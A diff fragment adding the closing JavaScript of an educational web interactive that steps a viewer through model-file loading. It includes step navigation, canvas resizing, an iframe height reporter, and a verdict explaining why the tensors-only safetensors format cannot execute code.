+  } else {state.ready=true;state.modelMode='ready';state.chipGlow=1;state.done=[true,false,true];
+    verdict.className='verdict good show';
+    verdict.innerHTML='<div class="vk">Data stayed data</div><div class="vt">Safetensors is a header plus raw floats. The loader copied numbers into the model and never ran an instruction, because the format has <b>no way to express one</b>. The same model, loaded safely. This is why a tensors-only format is the awareness-level default for any model you did not build yourself.</div>';
+  }
+}
+
+async function goNext(){
+  if(busy)return;const mx=maxStep();if(state.step>=mx)return;
+  busy=true;updateButtons();
+  const target=state.step+1, t=stepsArr()[target];
+  snapTo(target-1);
+  verdict.className='verdict'; verdict.innerHTML='';
+  setCap(t.step,t.cap,t.act==='call'?'fired':'');
+  await animateStep(t);
+  state.step=target;
+  if(state.step===mx)showVerdict();
+  busy=false;updateButtons();
+}
+function goPrev(){
+  if(busy||state.step<0)return;
+  state.step--;
+  snapTo(state.step);
+  verdict.className='verdict'; verdict.innerHTML='';
+  if(state.step<0)introCap();
+  else{const t=stepsArr()[state.step];setCap(t.step,t.cap,t.act==='call'?'fired':'');}
+  updateButtons();
+}
+function introCap(){setCap('Ready','Press Start, then use Next and Back to move through the loader at your own pace.');}
+function updateButtons(){
+  const mx=maxStep();
+  backBtn.disabled=busy||state.step<0;
+  nextBtn.disabled=busy||state.step>=mx;
+  nextBtn.textContent=state.step<0?'Start ▶':(state.step>=mx?'Done':'Next ▶');
+  resetBtn.disabled=busy;
+  rehint.textContent=busy?'…':(state.step<0?'Step through at your own pace.':(state.step>=mx?'Finished. Reset or switch formats to replay.':'Step '+(state.step+1)+' of '+(mx+1)));
+  sh();
+}
+function reset(){
+  busy=false;Object.assign(state,freshState());
+  verdict.className='verdict'; verdict.innerHTML='';
+  introCap();
+  updateButtons();
+}
+seg.addEventListener('click',e=>{const b=e.target.closest('.segbtn');if(!b||busy)return;fmt=b.dataset.f;
+  [...seg.children].forEach(x=>x.setAttribute('aria-pressed',x.dataset.f===fmt?'true':'false'));reset();});
+nextBtn.addEventListener('click',goNext);
+backBtn.addEventListener('click',goPrev);
+resetBtn.addEventListener('click',()=>{if(!busy)reset();});
+window.addEventListener('keydown',e=>{if(e.key==='ArrowRight'){goNext();}else if(e.key==='ArrowLeft'){goPrev();}});
+
+/* ---------- responsive ---------- */
+function resize(){const cssW=canvas.clientWidth||canvas.parentElement.clientWidth||W;const cssH=cssW*H/W;canvas.style.height=cssH+'px';
+  const dpr=Math.min(window.devicePixelRatio||1,2.5);canvas.width=Math.round(cssW*dpr);canvas.height=Math.round(cssH*dpr);
+  const s=cssW/W;ctx.setTransform(dpr*s,0,0,dpr*s,0,0);sh();}
+function sh(){const el=document.querySelector('.wrap');if(!el)return;const pad=parseFloat(getComputedStyle(document.body).paddingTop)+parseFloat(getComputedStyle(document.body).paddingBottom);
+  window.parent.postMessage({kind:'nyu-embed-height',height:Math.ceil(el.getBoundingClientRect().height+pad+24),src:location.href},'*');}
+new ResizeObserver(resize).observe(document.querySelector('.stagewrap'));
+window.addEventListener('load',()=>{resize();reset();setTimeout(sh,180);});
+resize();reset();loop();
+})();
+</script>
+
+<script>
+/* Frame height, reported for the life of the page (nyu-embed-height-observer).
+   The per-interactive height post usually fires only when the canvas resizes,
+   so text growing below the canvas never re-posts. Measure content, not the
+   viewport: the parent sizes the frame from this number, and measuring the
+   viewport would feed back and grow the frame on every message. */
+(function () {
+  var last = 0;
+  function contentHeight() {
+    var kids = document.body.children, max = 0;
+    for (var i = 0; i < kids.length; i++) {
+      var r = kids[i].getBoundingClientRect();
+      if (r.height) { max = Math.max(max, r.bottom + window.scrollY); }
+    }
+    if (!max) { return 0; }
+    var pb = parseFloat(getComputedStyle(document.body).paddingBottom) || 0;
+    return Math.ceil(max + pb + 16);
+  }
+  function post() {
+    var h = contentHeight();
+    if (!h || Math.abs(h - last) < 3) { return; }
+    last = h;
+    try {
+      parent.postMessage({ kind: 'nyu-embed-height', height: h, src: location.href }, '*');
+    } catch (e) { /* not embedded, or a cross-origin parent */ }
+  }
+  if (window.ResizeObserver) {
+    var ro = new ResizeObserver(post);
+    ro.observe(document.body);
+    for (var i = 0; i < document.body.children.length; i++) { ro.observe(document.body.children[i]); }
+  }
+  /* Safari settles webfonts after first layout, which is the case that broke. */
+  if (document.fonts && document.fonts.ready) { document.fonts.ready.then(post); }
+  window.addEventListener('load', post);
+  [60, 250, 700, 1500].forEach(function (t) { setTimeout(post, t); });
+  /* Reveals and step buttons change height without resizing the canvas. */
+  document.addEventListener('click', function () { setTimeout(post, 450); }, true);
+})();
+</script>
+</body>
+</html>
